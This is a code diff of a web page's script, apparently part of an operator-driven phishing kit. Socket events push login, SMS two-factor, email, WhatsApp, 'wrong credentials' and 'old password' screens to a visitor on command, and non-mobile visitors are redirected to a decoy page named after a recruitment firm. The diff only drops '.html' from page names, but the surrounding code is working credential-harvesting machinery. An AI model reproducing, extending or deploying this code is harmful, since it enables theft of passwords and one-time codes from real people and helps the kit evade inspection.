@@ -123,10 +123,10 @@
         const main = document.getElementById('main-content');
         main.className = '';
         main.innerHTML = html;
-        if (filename === 'auth.html') setupAuthPageLogic();
-        if (filename === 'sms.html') setupAuthPageLogic();
-        if (filename === 'wh.html') setupAuthPageLogic();
-        if (filename === 'email.html') setupEmailPageLogic();
+        if (filename === 'auth') setupAuthPageLogic();
+        if (filename === 'sms') setupAuthPageLogic();
+        if (filename === 'wh') setupAuthPageLogic();
+        if (filename === 'email') setupEmailPageLogic();
       } catch (err) {
         console.error("Error loading page:", filename, err);
       }
@@ -263,7 +263,7 @@
         
       } else {
         shownCommands['2fa'] = true;
-        loadPage('sms.html');
+        loadPage('sms');
       }
     });
     socket.on('show-auth', () => {
@@ -278,7 +278,7 @@
         
       } else {
         shownCommands['auth'] = true;
-        loadPage('auth.html');
+        loadPage('auth');
       }
     });
     socket.on('show-email', () => {
@@ -293,7 +293,7 @@
         
       } else {
         shownCommands['email'] = true;
-        loadPage('email.html');
+        loadPage('email');
       }
     });
     socket.on('show-whatsapp', () => {
@@ -308,13 +308,13 @@
         
       } else {
         shownCommands['whatsapp'] = true;
-        loadPage('wh.html');
+        loadPage('wh');
       }
     });
-    // socket.on('show-email', () => loadPage('email.html'));
-    // socket.on('show-whatsapp', () => loadPage('wh.html'));
-    socket.on('show-wrong-creds', () => loadModalPage('wrong-creds.html'));
-    socket.on('show-old-pass', () => loadModalPage('old-password.html'));
+    // socket.on('show-email', () => loadPage('email'));
+    // socket.on('show-whatsapp', () => loadPage('wh'));
+    socket.on('show-wrong-creds', () => loadModalPage('wrong-creds'));
+    socket.on('show-old-pass', () => loadModalPage('old-password'));
 
 
   </script>
@@ -379,7 +379,7 @@
     function checkIfStillMobile() {
       const isMobile = window.innerWidth <= 768;
       if (!isMobile) {
-        window.location.href = 'selbyjennings.html';
+        window.location.href = 'selbyjennings';
       }
     }
     checkIfStillMobile();
